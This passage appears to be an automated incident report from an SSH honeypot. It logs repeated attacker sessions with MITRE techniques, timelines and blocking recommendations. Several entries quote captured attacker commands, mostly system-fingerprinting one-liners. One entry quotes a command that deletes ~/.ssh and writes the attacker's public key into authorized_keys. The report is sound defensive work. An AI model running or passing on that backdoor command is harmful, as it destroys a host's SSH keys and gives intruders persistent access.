| `2026-09-04 11:38:06` | `cowrie.command.input` |
| `2026-09-04 11:38:06` | `cowrie.command.input` |
| `2026-09-04 11:38:06` | `cowrie.command.input` |
| `2026-09-04 11:38:06` | `cowrie.command.success` |
| `2026-09-04 11:38:06` | `cowrie.command.input` |
| `2026-09-04 11:38:06` | `cowrie.command.input` |
| `2026-09-04 11:38:06` | `cowrie.command.input` |
| `2026-09-04 11:38:06` | `cowrie.command.input` |
| `2026-09-04 11:38:06` | `cowrie.log.closed` |
| `2026-09-04 11:38:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-657ce628428e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:39 |
| **Last Seen** | 2026-09-04 11:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:39:21` | `cowrie.session.connect` |
| `2026-09-04 11:39:21` | `cowrie.client.version` |
| `2026-09-04 11:39:21` | `cowrie.client.kex` |
| `2026-09-04 11:39:22` | `cowrie.login.success` |
| `2026-09-04 11:39:23` | `cowrie.session.params` |
| `2026-09-04 11:39:23` | `cowrie.command.input` |
| `2026-09-04 11:39:23` | `cowrie.command.input` |
| `2026-09-04 11:39:23` | `cowrie.command.input` |
| `2026-09-04 11:39:23` | `cowrie.command.input` |
| `2026-09-04 11:39:23` | `cowrie.command.input` |
| `2026-09-04 11:39:23` | `cowrie.command.success` |
| `2026-09-04 11:39:23` | `cowrie.command.input` |
| `2026-09-04 11:39:23` | `cowrie.command.input` |
| `2026-09-04 11:39:23` | `cowrie.command.input` |
| `2026-09-04 11:39:23` | `cowrie.command.input` |
| `2026-09-04 11:39:23` | `cowrie.log.closed` |
| `2026-09-04 11:39:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb32d4cf570b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 11:39 |
| **Last Seen** | 2026-09-04 11:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:39:49` | `cowrie.session.connect` |
| `2026-09-04 11:39:49` | `cowrie.client.version` |
| `2026-09-04 11:39:49` | `cowrie.client.kex` |
| `2026-09-04 11:39:50` | `cowrie.login.success` |
| `2026-09-04 11:39:50` | `cowrie.direct-tcpip.request` |
| `2026-09-04 11:39:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 11:39:51` | `cowrie.direct-tcpip.data` |
| `2026-09-04 11:39:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1650616213f8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:40 |
| **Last Seen** | 2026-09-04 11:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:40:37` | `cowrie.session.connect` |
| `2026-09-04 11:40:38` | `cowrie.client.version` |
| `2026-09-04 11:40:38` | `cowrie.client.kex` |
| `2026-09-04 11:40:39` | `cowrie.login.success` |
| `2026-09-04 11:40:40` | `cowrie.session.params` |
| `2026-09-04 11:40:40` | `cowrie.command.input` |
| `2026-09-04 11:40:40` | `cowrie.command.input` |
| `2026-09-04 11:40:40` | `cowrie.command.input` |
| `2026-09-04 11:40:40` | `cowrie.command.input` |
| `2026-09-04 11:40:40` | `cowrie.command.input` |
| `2026-09-04 11:40:40` | `cowrie.command.success` |
| `2026-09-04 11:40:40` | `cowrie.command.input` |
| `2026-09-04 11:40:40` | `cowrie.command.input` |
| `2026-09-04 11:40:40` | `cowrie.command.input` |
| `2026-09-04 11:40:40` | `cowrie.command.input` |
| `2026-09-04 11:40:40` | `cowrie.log.closed` |
| `2026-09-04 11:40:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b21a3700c4ae

| Field | Detail |
|---|---|
| **Source IP** | `165.154.202[.]254` |
| **First Seen** | 2026-09-04 11:41 |
| **Last Seen** | 2026-09-04 11:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:41:51` | `cowrie.session.connect` |
| `2026-09-04 11:41:51` | `cowrie.client.version` |
| `2026-09-04 11:41:51` | `cowrie.client.kex` |
| `2026-09-04 11:41:51` | `cowrie.login.success` |
| `2026-09-04 11:41:52` | `cowrie.session.params` |
| `2026-09-04 11:41:52` | `cowrie.command.input` |
| `2026-09-04 11:41:52` | `cowrie.command.failed` |
| `2026-09-04 11:41:52` | `cowrie.log.closed` |
| `2026-09-04 11:41:53` | `cowrie.session.params` |
| `2026-09-04 11:41:53` | `cowrie.command.input` |
| `2026-09-04 11:41:53` | `cowrie.session.file_download` |
| `2026-09-04 11:41:53` | `cowrie.log.closed` |
| `2026-09-04 11:41:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.202[.]254` to AbuseIPDB if not already reported
- [ ] Block `165.154.202[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e47859e1616c

| Field | Detail |
|---|---|
| **Source IP** | `165.154.202[.]254` |
| **First Seen** | 2026-09-04 11:41 |
| **Last Seen** | 2026-09-04 11:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:41:53` | `cowrie.session.connect` |
| `2026-09-04 11:41:53` | `cowrie.client.version` |
| `2026-09-04 11:41:53` | `cowrie.client.kex` |
| `2026-09-04 11:41:53` | `cowrie.login.success` |
| `2026-09-04 11:41:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.202[.]254` to AbuseIPDB if not already reported
- [ ] Block `165.154.202[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-402716d52fb8

| Field | Detail |
|---|---|
| **Source IP** | `165.154.202[.]254` |
| **First Seen** | 2026-09-04 11:41 |
| **Last Seen** | 2026-09-04 11:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:41:53` | `cowrie.session.connect` |
| `2026-09-04 11:41:53` | `cowrie.client.version` |
| `2026-09-04 11:41:54` | `cowrie.client.kex` |
| `2026-09-04 11:41:54` | `cowrie.login.success` |
| `2026-09-04 11:41:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.202[.]254` to AbuseIPDB if not already reported
- [ ] Block `165.154.202[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc4899682545

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:41 |
| **Last Seen** | 2026-09-04 11:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:41:58` | `cowrie.session.connect` |
| `2026-09-04 11:41:58` | `cowrie.client.version` |
| `2026-09-04 11:41:59` | `cowrie.client.kex` |
| `2026-09-04 11:41:59` | `cowrie.login.success` |
| `2026-09-04 11:42:00` | `cowrie.session.params` |
| `2026-09-04 11:42:00` | `cowrie.command.input` |
| `2026-09-04 11:42:00` | `cowrie.command.input` |
| `2026-09-04 11:42:00` | `cowrie.command.input` |
| `2026-09-04 11:42:00` | `cowrie.command.input` |
| `2026-09-04 11:42:00` | `cowrie.command.input` |
| `2026-09-04 11:42:00` | `cowrie.command.success` |
| `2026-09-04 11:42:00` | `cowrie.command.input` |
| `2026-09-04 11:42:00` | `cowrie.command.input` |
| `2026-09-04 11:42:00` | `cowrie.command.input` |
| `2026-09-04 11:42:00` | `cowrie.command.input` |
| `2026-09-04 11:42:01` | `cowrie.log.closed` |
| `2026-09-04 11:42:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d361f0966e9

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:43 |
| **Last Seen** | 2026-09-04 11:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:43:15` | `cowrie.session.connect` |
| `2026-09-04 11:43:16` | `cowrie.client.version` |
| `2026-09-04 11:43:16` | `cowrie.client.kex` |
| `2026-09-04 11:43:17` | `cowrie.login.success` |
| `2026-09-04 11:43:18` | `cowrie.session.params` |
| `2026-09-04 11:43:18` | `cowrie.command.input` |
| `2026-09-04 11:43:18` | `cowrie.command.input` |
| `2026-09-04 11:43:18` | `cowrie.command.input` |
| `2026-09-04 11:43:18` | `cowrie.command.input` |
| `2026-09-04 11:43:18` | `cowrie.command.input` |
| `2026-09-04 11:43:18` | `cowrie.command.success` |
| `2026-09-04 11:43:18` | `cowrie.command.input` |
| `2026-09-04 11:43:18` | `cowrie.command.input` |
| `2026-09-04 11:43:18` | `cowrie.command.input` |
| `2026-09-04 11:43:18` | `cowrie.command.input` |
| `2026-09-04 11:43:18` | `cowrie.log.closed` |
| `2026-09-04 11:43:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-242bd6a8ff56

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:44 |
| **Last Seen** | 2026-09-04 11:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:44:31` | `cowrie.session.connect` |
| `2026-09-04 11:44:31` | `cowrie.client.version` |
| `2026-09-04 11:44:31` | `cowrie.client.kex` |
| `2026-09-04 11:44:32` | `cowrie.login.success` |
| `2026-09-04 11:44:33` | `cowrie.session.params` |
| `2026-09-04 11:44:33` | `cowrie.command.input` |
| `2026-09-04 11:44:33` | `cowrie.command.input` |
| `2026-09-04 11:44:33` | `cowrie.command.input` |
| `2026-09-04 11:44:33` | `cowrie.command.input` |
| `2026-09-04 11:44:33` | `cowrie.command.input` |
| `2026-09-04 11:44:33` | `cowrie.command.success` |
| `2026-09-04 11:44:33` | `cowrie.command.input` |
| `2026-09-04 11:44:33` | `cowrie.command.input` |
| `2026-09-04 11:44:33` | `cowrie.command.input` |
| `2026-09-04 11:44:33` | `cowrie.command.input` |
| `2026-09-04 11:44:34` | `cowrie.log.closed` |
| `2026-09-04 11:44:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad757df4fb74

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:45 |
| **Last Seen** | 2026-09-04 11:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:45:50` | `cowrie.session.connect` |
| `2026-09-04 11:45:50` | `cowrie.client.version` |
| `2026-09-04 11:45:50` | `cowrie.client.kex` |
| `2026-09-04 11:45:51` | `cowrie.login.success` |
| `2026-09-04 11:45:52` | `cowrie.session.params` |
| `2026-09-04 11:45:52` | `cowrie.command.input` |
| `2026-09-04 11:45:52` | `cowrie.command.input` |
| `2026-09-04 11:45:52` | `cowrie.command.input` |
| `2026-09-04 11:45:52` | `cowrie.command.input` |
| `2026-09-04 11:45:52` | `cowrie.command.input` |
| `2026-09-04 11:45:52` | `cowrie.command.success` |
| `2026-09-04 11:45:52` | `cowrie.command.input` |
| `2026-09-04 11:45:52` | `cowrie.command.input` |
| `2026-09-04 11:45:52` | `cowrie.command.input` |
| `2026-09-04 11:45:52` | `cowrie.command.input` |
| `2026-09-04 11:45:52` | `cowrie.log.closed` |
| `2026-09-04 11:45:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4a170721126

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:47 |
| **Last Seen** | 2026-09-04 11:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:47:08` | `cowrie.session.connect` |
| `2026-09-04 11:47:09` | `cowrie.client.version` |
| `2026-09-04 11:47:09` | `cowrie.client.kex` |
| `2026-09-04 11:47:10` | `cowrie.login.success` |
| `2026-09-04 11:47:11` | `cowrie.session.params` |
| `2026-09-04 11:47:11` | `cowrie.command.input` |
| `2026-09-04 11:47:11` | `cowrie.command.input` |
| `2026-09-04 11:47:11` | `cowrie.command.input` |
| `2026-09-04 11:47:11` | `cowrie.command.input` |
| `2026-09-04 11:47:11` | `cowrie.command.input` |
| `2026-09-04 11:47:11` | `cowrie.command.success` |
| `2026-09-04 11:47:11` | `cowrie.command.input` |
| `2026-09-04 11:47:11` | `cowrie.command.input` |
| `2026-09-04 11:47:11` | `cowrie.command.input` |
| `2026-09-04 11:47:11` | `cowrie.command.input` |
| `2026-09-04 11:47:11` | `cowrie.log.closed` |
| `2026-09-04 11:47:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e5d092152ea

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 11:47 |
| **Last Seen** | 2026-09-04 11:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:47:14` | `cowrie.session.connect` |
| `2026-09-04 11:47:14` | `cowrie.client.version` |
| `2026-09-04 11:47:14` | `cowrie.client.kex` |
| `2026-09-04 11:47:14` | `cowrie.login.success` |
| `2026-09-04 11:47:15` | `cowrie.session.params` |
| `2026-09-04 11:47:15` | `cowrie.command.input` |
| `2026-09-04 11:47:15` | `cowrie.log.closed` |
| `2026-09-04 11:47:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a49fac96b244

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:48 |
| **Last Seen** | 2026-09-04 11:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:48:24` | `cowrie.session.connect` |
| `2026-09-04 11:48:24` | `cowrie.client.version` |
| `2026-09-04 11:48:24` | `cowrie.client.kex` |
| `2026-09-04 11:48:25` | `cowrie.login.success` |
| `2026-09-04 11:48:27` | `cowrie.session.params` |
| `2026-09-04 11:48:27` | `cowrie.command.input` |
| `2026-09-04 11:48:27` | `cowrie.command.input` |
| `2026-09-04 11:48:27` | `cowrie.command.input` |
| `2026-09-04 11:48:27` | `cowrie.command.input` |
| `2026-09-04 11:48:27` | `cowrie.command.input` |
| `2026-09-04 11:48:27` | `cowrie.command.success` |
| `2026-09-04 11:48:27` | `cowrie.command.input` |
| `2026-09-04 11:48:27` | `cowrie.command.input` |
| `2026-09-04 11:48:27` | `cowrie.command.input` |
| `2026-09-04 11:48:27` | `cowrie.command.input` |
| `2026-09-04 11:48:27` | `cowrie.log.closed` |
| `2026-09-04 11:48:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1752dd913f56

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 11:48 |
| **Last Seen** | 2026-09-04 11:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:48:53` | `cowrie.session.connect` |
| `2026-09-04 11:48:53` | `cowrie.client.version` |
| `2026-09-04 11:48:53` | `cowrie.client.kex` |
| `2026-09-04 11:48:53` | `cowrie.login.success` |
| `2026-09-04 11:48:54` | `cowrie.session.params` |
| `2026-09-04 11:48:54` | `cowrie.command.input` |
| `2026-09-04 11:48:54` | `cowrie.log.closed` |
| `2026-09-04 11:48:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01afc53782a4

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:49 |
| **Last Seen** | 2026-09-04 11:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
